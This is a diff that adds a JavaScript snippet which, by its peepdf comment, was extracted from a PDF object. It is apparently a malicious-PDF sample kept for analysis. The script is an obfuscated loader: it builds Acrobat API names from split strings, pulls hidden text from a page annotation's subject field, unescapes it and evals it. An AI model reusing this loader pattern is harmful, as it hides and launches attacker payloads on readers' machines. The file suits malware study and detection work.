@@ -1,0 +1,20 @@
+// peepdf comment: Javascript code located in object 8 (version 0)
+
+var zozo = "g";
+var run = app.setInterval("zozo = \"x\";", 1000);
+var lolo = zozo;
+var ee = "";
+var z;
+var y;
+z = y = app.doc;
+y = 0;
+z["s" + ee + "yn" + ee + "cA" + ee + "nno" + ee + "tSc" + ee + "an"]();
+y = z;
+var p = y[zozo + "e" + ee + "tAn" + ee + "nots"]({
+    nPage: 0
+});
+var s = p[0]["sub" + ee + "je" + ee + "ct"];
+var l = s["re" + ee + "pl" + ee + "ac" + ee + "e"](/mmm/g, "" + ee + "%" + ee + "");
+s = unescape(l);
+eval(s);
+
